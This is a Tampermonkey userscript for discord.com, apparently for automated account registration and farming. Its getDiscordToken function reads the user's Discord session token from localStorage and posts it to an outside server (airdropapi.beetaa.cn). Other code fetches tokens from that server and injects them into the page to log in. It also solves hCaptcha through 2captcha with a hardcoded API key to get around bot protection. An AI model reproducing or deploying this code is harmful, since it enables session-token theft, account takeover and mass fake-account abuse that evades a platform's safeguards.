// ==UserScript==
// @name         disRegAndLoginV2
// @namespace    http://tampermonkey.net/
// @version      1.2
// @description  discord相关
// @author       lly
// @match        https://*.discord.com/*
// @icon         https://www.google.com/s2/favicons?domain=google.com
// @require      https://cdn.bootcdn.net/ajax/libs/jquery/3.4.1/jquery.min.js
// @require      https://cdn.bootcdn.net/ajax/libs/crypto-js/3.1.9-1/crypto-js.min.js
// @require      https://cdn.bootcdn.net/ajax/libs/jquery-cookie/1.4.1/jquery.cookie.min.js
// @require      https://cdn.bootcdn.net/ajax/libs/Base64/1.1.0/base64.min.js
// @require      https://cdn.jsdelivr.net/npm/clshuangcool@3.0.0/unibabel/index.js
// @require      https://cdn.jsdelivr.net/npm/clshuangcool@3.0.0/unibabel/unibabel.hex.js
// @require      https://cdn.jsdelivr.net/npm/clshuangcool@3.0.0/unibabel/unibabel.base32.js
// @require      https://cdn.jsdelivr.net/npm/clshuangcool@3.0.0/forge/dist/forge.min.js
// @require      https://cdn.jsdelivr.net/npm/clshuangcool@3.0.0/botp/sha1-hmac.js
// @require      https://cdn.jsdelivr.net/npm/clshuangcool@3.0.0/botp/index.js
// @require      https://cdn.jsdelivr.net/npm/clshuangcool@3.0.0/authenticator.js
// @require      https://greasyfork.org/scripts/433356-authenticator/code/authenticator.js?version=975957
// @require      https://cdn.jsdelivr.net/npm/Faker@0.7.2/Faker.js
// @grant        GM_xmlhttpRequest
// @connect      weleader5.oss-cn-shenzhen.aliyuncs.com
// @connect      pv.sohu.com
// @connect      jwc.08px.cn
// @connect      clcode.getpx.cn
// @connect      2captcha.com
// @connect      smshub.org
// @connect      beetaa.cn
// @grant        unsafeWindow
// @grant        GM_addStyle
// @grant        GM_deleteValue
// @grant        GM_listValues
// @grant        GM_addValueChangeListener
// @grant        GM_removeValueChangeListener
// @grant        GM_setValue
// @grant        GM_getValue
// @grant        GM_log
// @grant        GM_getResourceText
// @grant        GM_getResourceURL
// @grant        GM_registerMenuCommand
// @grant        GM_unregisterMenuCommand
// @grant        GM_openInTab
// @grant        GM_xmlhttpRequest
// @grant        GM_download
// @grant        GM_getTab
// @grant        GM_saveTab
// @grant        GM_getTabs
// @grant        GM_notification
// @grant        GM_setClipboard
// @grant        GM_info
// @license      lly
// @downloadURL https://update.greasyfork.org/scripts/445052/disRegAndLoginV2.user.js
// @updateURL https://update.greasyfork.org/scripts/445052/disRegAndLoginV2.meta.js
// ==/UserScript==

(function() {
    'use strict';
	//程序入口-main
	var pageurl = window.location.href.split('//')[1].split('?')[0];
	var automatic = getQueryString("automatic");
	if(pageurl == 'discord.com/channels/@me' && automatic && automatic=='0'){
		getDiscordToken()
	}
    $(function () {
		pageOperate()
	})
    // Your code here...
	function pageOperate() {
        var pageurl = window.location.href.split('//')[1].split('?')[0];
		var automatic = getQueryString("automatic");
		switch (pageurl) {
				case 'discord.com/':
					if(automatic == 'replace'){
						//第一步执行清除Cookie 和 本地缓存操作
						setTimeout(function(){
							window.postMessage({ type:  {"type":"delcookie","value":"https://discord.com"}}, "*");
							window.postMessage({ type:  {"type":"delcookie","value":"https://www.discord.com"}}, "*");
							window.postMessage({ type:  {"type":"localStorageClear","value":"https://www.discord.com"}}, "*");
							window.postMessage({ type:  {"type":"sessionStorageClear","value":"https://www.discord.com"}}, "*");
							setTimeout(function(){
								GM_xmlhttpRequest({
									url: 'http://airdropapi.beetaa.cn:3019/api/Discord_Main/UpdateAccount',
									method: "POST",
									data: JSON.stringify({}),
									headers: {
										"Content-type": "application/json"
									},
									onload: function (capcoderes) {
										console.log(capcoderes)
										if (capcoderes.responseText && capcoderes.status==200) {
											//registerPage()
											console.log(1)
											var ipdata = JSON.parse(capcoderes.responseText);
											if(ipdata["status"] == 200){
												var regdata = ipdata["response"]
												console.info(regdata)
												unsafeWindow.location.href = "https://discord.com/login?automatic=token";
												//addLoginToken(regdata["Token"])
											}
										}
									}
								});
							}, 3000)
						}, 5000) 
						/* setTimeout(function(){
							GM_xmlhttpRequest({
								url: 'http://airdropapi.beetaa.cn:3019/api/Discord_Main/UpdateAccount',
								method: "POST",
								data: JSON.stringify({}),
								headers: {
									"Content-type": "application/json"
								},
								onload: function (capcoderes) {
									console.log(capcoderes)
									if (capcoderes.responseText && capcoderes.status==200) {
										//registerPage()
										console.log(1)
										var ipdata = JSON.parse(capcoderes.responseText);
										if(ipdata["status"] == 200){
											var regdata = ipdata["response"]
											addLoginToken(regdata["Token"])
										}
									}
								}
							});
						}, 3000) */
					}
				break;
				case 'discord.com/login':
					if(automatic == 'token'){
						GM_xmlhttpRequest({
							url: 'http://airdropapi.beetaa.cn:3019/api/Discord_Main/GetOneAcc',
							method: "POST",
							data: JSON.stringify({}),
							headers: {
								"Content-type": "application/json"
							},
							onload: function (capcoderes) {
								console.log(capcoderes)
								if (capcoderes.responseText && capcoderes.status==200) {
									//registerPage()
									console.log(1)
									var ipdata = JSON.parse(capcoderes.responseText);
									if(ipdata["status"] == 200){
										
										var regdata = ipdata["response"]
										addLoginToken(regdata["Token"])
									}
								}
							}
						});

					}
					break;
				case 'discord.com/register':
					if(automatic == '1'){
						//自动注册
						//TODO 通过接口获取注册数据
						GM_xmlhttpRequest({
							url: 'http://airdropapi.beetaa.cn:3019/api/Discord_Main/GetOneAcc',
							method: "POST",
							data: JSON.stringify({}),
							headers: {
								"Content-type": "application/json"
							},
							onload: function (capcoderes) {
								console.log(capcoderes)
								if (capcoderes.responseText && capcoderes.status==200) {
									//registerPage()
									console.log(1)
									var ipdata = JSON.parse(capcoderes.responseText);
									if(ipdata["status"] == 200){
										
										var regdata = ipdata["response"]
										registerPage(regdata)
									}
								}
							}
						});

					}
				break;
				case 'discord.com/channels/@me':
					//getDiscordToken()
				break;
			
		}
	}


	function discordStateUpdate(IsReg){
		GM_xmlhttpRequest({
			url: 'http://airdropapi.beetaa.cn:3019/api/Discord_Main/GetOneAcc',
			method: "POST",
			data: JSON.stringify({}),
			headers: {
				"Content-type": "application/json"
			},
			onload: function (capcoderes) {
				console.log(capcoderes)
				if (capcoderes.responseText && capcoderes.status==200) {
					//registerPage()
					console.log(1)
					var ipdata = JSON.parse(capcoderes.responseText);
					if(ipdata["status"] == 200){
						var regdata = ipdata["response"]
						regdata["IsReg"] = IsReg
						//更新数据
						GM_xmlhttpRequest({
							url: 'http://airdropapi.beetaa.cn:3019/api/Discord_Main/Post',
							method: "POST",
							data: JSON.stringify(regdata),
							headers: {
								"Content-type": "application/json"
							},
							onload: function (capcoderes) {
								console.log(capcoderes)
							}
						});

					}
				}
			}
		});
	}

	function jihuoPage(url){
		unsafeWindow.location.href = url;
	}

	function addLoginToken(token){
		unsafeWindow.t = token;
		unsafeWindow.localStorage = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage;
		unsafeWindow.setInterval(() => unsafeWindow.localStorage.token = `"${unsafeWindow.t}"`); 
		unsafeWindow.location.href = 'https://discord.com/channels/@me';
	}
	function getDiscordToken(){
		if(!window.localStorage) {
			Object.defineProperty(window, "localStorage", new(function () {
			   var aKeys = [],
				  oStorage = {};
			   Object.defineProperty(oStorage, "getItem", {
				  value: function (sKey) {
					 return this[sKey] ? this[sKey] : null;
				  },
				  writable: false,
				  configurable: false,
				  enumerable: false
			   });
			   Object.defineProperty(oStorage, "key", {
				  value: function (nKeyId) {
					 return aKeys[nKeyId];
				  },
				  writable: false,
				  configurable: false,
				  enumerable: false
			   });
			   Object.defineProperty(oStorage, "setItem", {
				  value: function (sKey, sValue) {
					 if(!sKey) {
						return;
					 }
					 document.cookie = escape(sKey) + "=" + escape(sValue) + "; expires=Tue, 19 Jan 2038 03:14:07 GMT; path=/";
				  },
				  writable: false,
				  configurable: false,
				  enumerable: false
			   });
			   Object.defineProperty(oStorage, "length", {
				  get: function () {
					 return aKeys.length;
				  },
				  configurable: false,
				  enumerable: false
			   });
			   Object.defineProperty(oStorage, "removeItem", {
				  value: function (sKey) {
					 if(!sKey) {
						return;
					 }
					 document.cookie = escape(sKey) + "=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/";
				  },
				  writable: false,
				  configurable: false,
				  enumerable: false
			   });
			   Object.defineProperty(oStorage, "clear", {
				  value: function () {
					 if(!aKeys.length) {
						return;
					 }
					 for(var sKey in aKeys) {
						document.cookie = escape(sKey) + "=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/";
					 }
				  },
				  writable: false,
				  configurable: false,
				  enumerable: false
			   });
			   this.get = function () {
				  var iThisIndx;
				  for(var sKey in oStorage) {
					 iThisIndx = aKeys.indexOf(sKey);
					 if(iThisIndx === -1) {
						oStorage.setItem(sKey, oStorage[sKey]);
					 } else {
						aKeys.splice(iThisIndx, 1);
					 }
					 delete oStorage[sKey];
				  }
				  for(aKeys; aKeys.length > 0; aKeys.splice(0, 1)) {
					 oStorage.removeItem(aKeys[0]);
				  }
				  for(var aCouple, iKey, nIdx = 0, aCouples = document.cookie.split(/\s*;\s*/); nIdx < aCouples.length; nIdx++) {
					 aCouple = aCouples[nIdx].split(/\s*=\s*/);
					 if(aCouple.length > 1) {
						oStorage[iKey = unescape(aCouple[0])] = unescape(aCouple[1]);
						aKeys.push(iKey);
					 }
				  }
				  return oStorage;
			   };
			   this.configurable = false;
			   this.enumerable = true;
			})());
		 }
		 //---------------------------------------------------
	  
		 var userToken = localStorage.getItem('token');
	  
		 var warn = "Giving people tokens is a good idea! :3"
	  
		 // show warning, if accepted show token
		 document.addEventListener('readystatechange', event => {
			if(event.target.readyState === "interactive") {} else if(event.target.readyState === "complete") {
			   setTimeout(function () {
				  //if(confirm(warn)) {
				  //	 prompt("Your token:", userToken)
				  //}
				  //存储用户Token
				  console.info("================================")
				  console.info(userToken)

				  GM_xmlhttpRequest({
						url: 'http://airdropapi.beetaa.cn:3019/api/Discord_Main/GetOneAcc',
						method: "POST",
						data: JSON.stringify({}),
						headers: {
							"Content-type": "application/json"
						},
						onload: function (capcoderes) {
							console.log(capcoderes)
							if (capcoderes.responseText && capcoderes.status==200) {
								//registerPage()
								console.log(1)
								var ipdata = JSON.parse(capcoderes.responseText);
								if(ipdata["status"] == 200){
									var regdata = ipdata["response"]
									regdata["IsReg"] = "105"
									regdata["Token"] = userToken.replace("\"","").replace("\"","")
                                    console.info(regdata)
									//更新数据
									GM_xmlhttpRequest({
										url: 'http://airdropapi.beetaa.cn:3019/api/Discord_Main/Post',
										method: "POST",
										data: JSON.stringify(regdata),
										headers: {
											"Content-type": "application/json"
										},
										onload: function (capcoderes) {
											console.log(capcoderes)
										}
									});
			
								}
							}
						}
					});


				  console.info("================================")
			   }, 3000);
			}
		 });
	}
	function changeReactInputValue(inputDom,newText){
		let lastValue = inputDom.value;
		inputDom.value = newText;
		let event = new Event('input', { bubbles: true });
		event.simulated = true;
		let tracker = inputDom._valueTracker;
		if (tracker) {
		tracker.setValue(lastValue);
		}
		inputDom.dispatchEvent(event);
	}

    function hcaptchaAuto(selfsitekeycap) {
        //去做h人机验证
        if (selfsitekeycap) {
            console.info('http://2captcha.com/in.php?key=713882cc1979e7de38a57e9870ce616f&method=hcaptcha&sitekey=' + selfsitekeycap + '&pageurl=https://discord.com/register/');
            GM_xmlhttpRequest({
                url: 'http://2captcha.com/in.php?key=713882cc1979e7de38a57e9870ce616f&method=hcaptcha&sitekey=' + selfsitekeycap + '&pageurl=https://discord.com/register/',
                method: "GET",
                data: "",
                headers: {
                    "Content-type": "application/x-www-form-urlencoded"
                },
                onload: function (capdata) {
                    console.info(capdata.responseText);
                    var capcode = capdata.responseText;
                    if (capcode && capcode.split('|').length > 1) {
                        capcode = capcode.split('|')[1];
                        var codeEnd = '';
                        var inal = setInterval(function () {
                            console.info('开始执行');
                            console.info('http://2captcha.com/res.php?key=713882cc1979e7de38a57e9870ce616f&action=get&id=' + capcode + '&tt=' + Date.parse(new Date()).toString())
                            GM_xmlhttpRequest({
                                url: 'http://2captcha.com/res.php?key=713882cc1979e7de38a57e9870ce616f&action=get&id=' + capcode + '&tt=' + Date.parse(new Date()).toString(),
                                method: "GET",
                                data: "",
                                headers: {
                                    "Content-type": "application/x-www-form-urlencoded"
                                },
                                onload: function (capcoderes) {
                                    if (capcoderes.responseText && capcoderes.responseText.length > 50 && capcoderes.responseText.split('|').length > 1) {
                                        clearInterval(inal);
                                        codeEnd = capcoderes.responseText.split('|')[1];
                                        //赋值
                                        console.info('谷歌验证请求code', codeEnd)
                                        console.info('谷歌验证请求unsafeWindow', unsafeWindow)
                                        $('textarea').show();
                                        $('textarea').val(codeEnd);
                                        for (var key in unsafeWindow) {
                                            if (key.indexOf('hcaptchaCallback') > -1) {
                                                console.info('找到了回调方法+++++', key);
                                                eval(key + '("' + codeEnd + '")');
                                                break;
                                            }
                                        }

                                        //___grecaptcha_cfg.clients['0']['l']['l'].callback(codeEnd)
                                        console.info('H验证请求成功')
                                    }
                                    //console.info(capcoderes.responseText);
                                }
                            });

                        }, 1000);
                    }
                }
            });
        }

    }
	
	function sleep(delay) {
		var start = (new Date()).getTime();
		while ((new Date()).getTime() - start < delay) {
		continue;
		}
	}
	
	 //采用正则表达式获取地址栏参数
    function getQueryString(name) {
        let reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i");
        let r = window.location.search.substr(1).match(reg);
        if (r != null) {
            return decodeURIComponent(r[2]);
        };
        return null;
    }




})();